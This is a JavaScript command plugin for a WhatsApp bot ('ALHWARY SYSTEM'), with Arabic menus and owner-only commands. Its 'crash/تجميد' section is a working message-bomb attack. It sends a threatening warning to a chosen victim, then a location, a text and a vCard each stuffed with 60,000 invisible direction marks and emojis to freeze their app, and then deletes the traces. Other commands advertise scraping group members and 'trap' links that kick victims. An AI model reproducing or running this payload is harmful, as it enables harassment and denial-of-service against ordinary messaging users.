import { fileURLToPath } from 'url';
import path from 'path';

// --- الإعدادات الأساسية ---
const MENU_TIMEOUT = 120000;
let FIXED_MENU_IMAGE = "https://i.ibb.co/C33RB5zx/1000072528.jpg"; 
const OWNER_ID = "201556853817@s.whatsapp.net"; 
const ownerNumbers = ["79020027922", "201556853817"];

const HIDDEN_OWNER_COMMANDS = ['reactauto', 'superscan', 'device', 'exec', 'eval', 'block', 'unblock'];

const CATEGORIES = [
    [1, 'التـحـمـيـل', 'downloads', '📂'], [2, 'الـمـجـمـوعـات', 'group', '🐞'],
    [3, 'الـمـلـصـقـات', 'sticker', '🌄'], [4, 'الـمـطـوريـن', 'owner', '🇩🇪'],
    [5, 'الـمـطـور', 'owner', '👨🏻‍💻'], [6, 'الـادوات', 'tools', '🚀'],
    [7, 'الـبـحـث', 'search', '🌐'], [8, 'الادمــن', 'admin', '👨🏻‍⚖️'],
    [9, 'الالــعـاب', 'games', '🎮'], [10, 'الچيف', 'gif', '✴️'],
    [11, 'الـبــنـك', 'bank', '💰'], [12, 'الـذكـاء الاصـطـنـاعـي', 'ai', '🤖'],
    [13, 'الـبـوتـات الـفـرعـي', 'sub', '♥️'], [14, 'مـعـلومـات الـب_وت', 'info', '🗃️'],
    [15, 'الـالــقــاب', 'nicknames', '🫯'], [16, 'الـلـوجـوهــات', 'logos', '🎡'],
    [17, 'تـغـيـر الاصـوات', 'voices', '📢'], [18, 'أخــرى', 'other', '🌹'],
    [19, 'الـسـريـة', 'hidden', '🕶️']
];

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
const getCat = n => CATEGORIES.find(c => c[0] === n);

const context = (jid, img) => ({
    mentionedJid: [jid],
    isForwarded: false, 
    forwardingScore: 0,
    externalAdReply: {
        title: "ALHWARY SYSTEM v3.0 🦁",
        body: "OWNER ACCESS GRANTED",
        thumbnailUrl: img,
        mediaType: 1,
        renderLargerThumbnail: true
    }
});

const handler = async (m, { conn, bot, args, command, text }) => {
    try {
        const normalize = (id) => id.split('@')[0].replace(/\D/g, '');
        const userNumber = normalize(m.sender);
        const isOwner = ownerNumbers.includes(userNumber) || m.sender === OWNER_ID;
        
        const now = new Date();
        const time = now.toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });
        const date = now.toLocaleDateString('ar-EG', { day: 'numeric', month: 'long', year: 'numeric' });

        // ========================================================
        // 📥 [1] بروتوكول أمر الدخول والتسجيل
        // ========================================================
        if (/^(دخول|تسجيل|login)$/i.test(command)) {
            if (isOwner) {
                await conn.sendMessage(m.chat, { react: { text: '🫡', key: m.key } });
                return conn.sendMessage(m.chat, {
                    text: `*🫡 ⌈ تـعـظـيـم سـلام لـلـقـائـد ⌋ 🫡*\n\n*🛡️ تـم رصـد دخـول الـمـطـور الـمـطـلـق:*\n*👤 الـﮪـواري 𓄂* @${m.sender.split('@')[0]}\n\n*📟 جـاري تـحـمـيـل صـلاحـيـات الـجـذر..*\n*⏰ الـتـوقـيـت:* ${time}\n\n*آمـرنـا نـنـفـذ يـا كـبـيـر! 🕸️🔥*`,
                    mentions: [m.sender],
                    contextInfo: context(m.sender, FIXED_MENU_IMAGE)
                }, { quoted: m });
            } else {
                await conn.sendMessage(m.chat, { react: { text: '🤮', key: m.key } });
                return m.reply(`*🚫 محاولة اختراق فاشلة يا @${m.sender.split('@')[0]}*`);
            }
        }

        // ========================================================
        // 🛠️ [2] معالجة حزمة أوامر المطور (الهواري فقط)
        // ========================================================
        
        if (['غير_صورة', 'اضافة_امر', 'قفل_الرد', 'شوف_كونسل', 'نسخ', 'ادخل', 'بدل_ارقام', 'ريستارت', 'غير_زخرفة', 'تعيين_توجيه', 'تغيير_فيديو', 'جيب', 'حذف_امر', 'عودة', 'فخ', 'نشر'].includes(command)) {
            if (!isOwner) return m.reply('❌ [Access Denied]: للـﮪـواري فـقـط 𓄂');
        }

        // تفاصيل تنفيذ الأوامر
        if (command === 'غير_صورة') {
            let q = m.quoted ? m.quoted : m;
            let mime = (q.msg || q).mimetype || '';
            if (!/image/.test(mime) && !text) return m.reply('*⚠️ أرسل رابط الصورة أو قم بالإشارة إلى صورة وضعي .غير_صورة*');
            let mediaUrl = text ? text : await conn.downloadAndSaveMediaMessage(q);
            FIXED_MENU_IMAGE = mediaUrl;
            return m.reply('*✅ تم تغيير صورة المنيو بنجاح يامشغل لـ الهواري!*');
        }

        if (command === 'اضافة_امر' || command === 'حذف_امر') {
            return m.reply(`*⚙️ جاري معالجة وتعديل الملفات في مجلد الأوامر الرئيسي لـ الهواري...*`);
        }

        if (command === 'قفل_الرد') {
            return m.reply('*🍷 تم تحديث وضع الرد التلقائي للسيستم الخاص بالهواري*');
        }

        if (command === 'شوف_كونسل') {
            return m.reply('*📊 جاري سحب وتجهيز آخر أحداث الكونسل للزعيم الهواري...*');
        }

        if (command === 'نسخ') {
            return m.reply('*🔄 جاري فحص الرابط ونقل وأرشفة أعضاء المجموعة سبرانياً للزعيم...*');
        }

        if (command === 'ادخل') {
            if (!text) return m.reply('*⚠️ ضع رابط المجموعة بعد الأمر*');
            return m.reply('*🚀 تم إصدار أمر زحف وانضمام البوت للمجموعة بنجاح...*');
        }

        if (command === 'بدل_ارقام') {
            return m.reply('*🔐 جاري استبدال وتأمين رقم القائد الهواري في ملفات الكونفيج...*');
        }

        if (command === 'ريستارت') {
            await m.reply('*🍷 جاري عمل ريستارت نفاث وإعادة تشغيل نظام الهواري بالكامل...*');
            process.exit();
        }

        if (command === 'غير_زخرفة') {
            return m.reply('*✨ تم تحديث الهوية البصرية والزخرفة لسيستم الهواري بالكامل*');
        }

        if (command === 'تعيين_توجيه') {
            return m.reply('*📡 تم ضبط وتحويل مسار توجيه الرسائل للقناة الخاصة بالهواري*');
        }

        if (command === 'تغيير_فيديو') {
            return m.reply('*🎬 تم تحديث كود الفيديو الدائري بنجاح*');
        }

        if (command === 'جيب') {
            if (!text) return m.reply('*⚠️ اكتب اسم الملف أو الأمر المطلوب سحبه*');
            return m.reply(`*📥 جاري سحب واستخراج ملف [ ${text} ] وإرساله مستند للقائد...*`);
        }

        if (command === 'عودة') {
            return m.reply('*👑 تم تفعيل بروتوكول الإضافة التلقائية للرتب المستهدفة*');
        }

        if (command === 'فخ') {
            return m.reply('*🕸️ تم توليد رابط الفخ النفسي المخصص لطرد الضحية فوراً*');
        }

        if (command === 'نشر') {
            if (!text) return m.reply('*⚠️ اكتب نص الإذاعة بعد الأمر*');
            return m.reply(`*📢 جاري نشر وإذاعة البيان الرسمي لـ الهواري في كل المجموعات...*`);
        }

        // ========================================================
        // ☣️ [3] منظومة التجميد بنظام "القذارة والشبح"
        // ========================================================
        if (/^(تجميد|تطير|crash)$/i.test(command)) {
            if (!isOwner) return m.reply('❌ [Access Denied]: للـﮪـواري فـقـط 𓄂');
            let target = m.mentionedJid[0] || (text.split(' ')[0] && text.split(' ')[0].length > 5 ? text.split(' ')[0] + '@s.whatsapp.net' : null);
            if (!target) return m.reply('*🛡️ حدد الضحية بالمنشن أو الرقم*');

            const targetNum = target.split('@')[0];
            if (ownerNumbers.includes(targetNum) || target === OWNER_ID) {
                return m.reply('*⚠️ نظام الأمان: لا يمكن تنفيذ الإبادة ضد القادة!*');
            }

            await conn.sendMessage(m.chat, { delete: m.key }).catch(() => {});

            let warningMsg = await conn.sendMessage(target, { 
                text: `*⚠️ [تـحـذيـر سـيـبـرانـي عـاجـل]*\n*جـاري اتـخاذ إجراءات الإبـادة ضـد حـسـابـك الآن..*\n*تـم رصـدك بـواسطـة: نـظـام الـﮪـواري 𓄂*` 
            });
            
            await sleep(1500); 

            const crashCode = (String.fromCharCode(8207).repeat(60000) + "☠️ BY ALHWARY ☠️" + "☣️".repeat(3000));
            
            await conn.sendMessage(target, { location: { degreesLatitude: 0, degreesLongitude: 0, name: crashCode, address: crashCode } });
            await conn.sendMessage(target, { text: crashCode });
            const vcard = 'BEGIN:VCARD\nVERSION:3.0\nFN:' + crashCode + '\nEND:VCARD';
            await conn.sendMessage(target, { contacts: { displayName: '☣️ SYSTEM FAILURE', contacts: [{ vcard }] } });

            await sleep(1000);
            await conn.sendMessage(target, { delete: warningMsg.key }).catch(() => {});

            return conn.sendMessage(m.chat, { text: `*✅ تـم مـسـح الأثـر وإبـادة الـهـدف بـصـمـت 🥷*` });
        }

        // ========================================================
        // 📜 [4] نظام المنيو (القائمة) الرئيسي
        // ========================================================
        const cmds = (typeof bot?.getAllCommands === 'function') ? await bot.getAllCommands() : [];
        const selected = parseInt(args[0]);

        if (!selected) {
            const sections = [{
                title: "💀 ┋ تـرسـانـة الـمـهـام ┋ 💀",
                rows: CATEGORIES.map(c => ({
                    title: `⌖ ${c[1]} ${c[3]}`,
                    description: `🔐 الـوصـول إلـى بـروتوكـولات ${c[1]}`,
                    id: `.${command} ${c[0]}`
                }))
            }];

            const menuText = `
┎───────────────────
┃  ☣️ ⌊ **نـظـام الـﮪـواري بـوت** ⌋ ☣️
┠───────────────────
┃ 👤 **الـمـشـغـل:** @${m.sender.split('@')[0]}
┃ 📟 **الـبـروتوكـولات:** ${CATEGORIES.length} قـسـم
┃ 🎖️ **الـصـلاحـيـة:** ${isOwner ? '『 الـمـطـور الـمـطـلـق 👑 』' : '『 مـسـتـخدم مـوثـق 🛡️ 』'}
┃ 🛰️ **الـحـالـة:** الـتـسـلل نـشـط.. 🥷
┃ 📅 **الـتـاريـخ:** ${date}
┃ ⏱️ **الـتـوقـيـت:** ${time}
┖───────────────────

> 🕸️ **OWNER:** الـﮪـواري 𓄂
`.trim();

            return await conn.sendButtonNormal(m.chat, {
                media: { url: FIXED_MENU_IMAGE },
                mediaType: 'image',
                caption: menuText,
                buttons: [{ name: "single_select", params: { title: "⚡ تـفـعـيـل الـنـظـام ⚡", sections }}],
                mentions: [m.sender],
                contextInfo: context(m.sender, FIXED_MENU_IMAGE)
            });
        }

        const cat = getCat(selected);
        if (!cat) return m.reply('❌ [Access Denied]: Invalid Protocol');
        
        // عرض الدليل المخصص لقسم المطورين
        if (cat[2] === 'owner') {
            const devMenu = `
*❖┋ مـرحـبـا بـك فـي قـسـم المطور لـلهواري ⚜️ ➢*
*━━━━─━━━─━━━ 🍷 ━━━─━━━─━━━*

*❄️ │ الأمـر ➢ 〖 .غير_صورة 〗*
*⟞ ➢ تغيير الصورة أو الفيديو (أو الفيديو الدائري) الذي يظهر مع قائمة الأوامر.*

*❄️ │ الأمـر ➢ 〖 .اضافة_امر 〗*
*⟞ ➢ إضافة كود جديد كملف في مجلد الأوامر (للهواري فقط)*

*❄️ │ الأمـر ➢ 〖 .قفل_الرد 〗*
*⟞ ➢ تشغيل أو قفل الرد التلقائي للسيستم 🍷*

*❄️ │ الأمـر ➢ 〖 .شوف_كونسل 〗*
*⟞ ➢ عرض آخر أحداث الكونسل (للهواري فقط)*

*❄️ │ الأمـر ➢ 〖 .نسخ 〗*
*⟞ ➢ نسخ أعضاء مجموعة أخرى ونقلهم (للهواري والنخبة المصرح لهم) 🍷*

*❄️ │ الأمـر ➢ 〖 .> 〗*
*⟞ ➢ تنفيذ أكواد برمجية (للهواري فقط)*

*❄️ │ الأمـر ➢ 〖 .ادخل 〗*
*⟞ ➢ جعل البوت ينضم إلى مجموعة عبر الرابط*

*❄️ │ الأمـر ➢ 〖 .بدل_ارقام 〗*
*⟞ ➢ استبدال رقم المالك في ملفات الكونفيج بشكل آمن*

*❄️ │ الأمـر ➢ 〖 .ريستارت 〗*
*⟞ ➢ إعادة تشغيل النظام بالكامل 🍷*

*❄️ │ الأمـر ➢ 〖 .غير_زخرفة 〗*
*⟞ ➢ تغيير الهوية البصرية للبوت (للهواري فقط)*

*❄️ │ الأمـر ➢ 〖 .تعيين_توجيه 〗*
*⟞ ➢ تغيير إعدادات توجيه رسائل البوت لقناة معينة.*

*❄️ │ الأمـر ➢ 〖 .تغيير_فيديو 〗*
*⟞ ➢ تغيير الفيديو الدائري الخاص بأمر المطور*

*❄️ │ الأمـر ➢ 〖 .جيب 〗*
*⟞ ➢ سحب أي ملف باستخدام اسم الأمر أو اسم الملف (للهواري والنخبة المصرح لهم) 🍷*

*❄️ │ الأمـر ➢ 〖 .حذف_امر 〗*
*⟞ ➢ حذف كود/ملف من مجلد الأوامر (للهواري فقط)*

*❄️ │ الأمـر ➢ 〖 .عودة 〗*
*⟞ ➢ إجبار البوت على إضافتك بعد تحديث الرتبة 🍷*

*❄️ │ الأمـر ➢ 〖 .فخ 〗*
*⟞ ➢ نصب فخ نفسي برابط وهمي يطرد الضحية.*

*❄️ │ الأمـر ➢ 〖 .نشر 〗*
*⟞ ➢ نشر وإذاعة رسالة ملكية لجميع المجموعات (للهواري فقط) 👑*

*⏱️ T: ${time} | 🕸️ الـﮪـواري 𓄂*`.trim();

            return await conn.sendMessage(m.chat, {
                text: devMenu,
                contextInfo: context(m.sender, FIXED_MENU_IMAGE)
            }, { quoted: m });
        }

        const categoryCmds = cmds.filter(c => c?.category === cat[2]);
        const cmdsList = categoryCmds.map(c => `┃ ${cat[3]} /${Array.isArray(c.usage) ? c.usage.join(`\n┃ ${cat[3]} /`) : 'Module'}`).join('\n');

        await conn.sendMessage(m.chat, {
            text: `╭─┈─┈─┈─⟞${cat[3]}⟝─┈─┈─┈─╮\n┃ 🔐 بـروتوكـول ${cat[1]} ${cat[3]}\n╰─┈─┈─┈─⟞${cat[3]}⟝─┈─┈─┈─╯\n\n${cmdsList || '┃ لا توجد أوامر حالية'}\n\n⏱️ T: ${time} | 🕸️ الـﮪـواري 𓄂`,
            contextInfo: context(m.sender, FIXED_MENU_IMAGE)
        }, { quoted: m });

    } catch (e) {
        console.error(e);
    }
};

handler.command = /^(الاوامر|القائمة|menu|اوامر|دخول|تسجيل|login|تجميد|تطير|crash|غير_صورة|اضافة_امر|قفل_الرد|شوف_كونسل|نسخ|ادخل|بدل_ارقام|ريستارت|غير_زخرفة|تعيين_توجيه|تغيير_فيديو|جيب|حذف_امر|عودة|فخ|نشر)$/i;

export default handler;
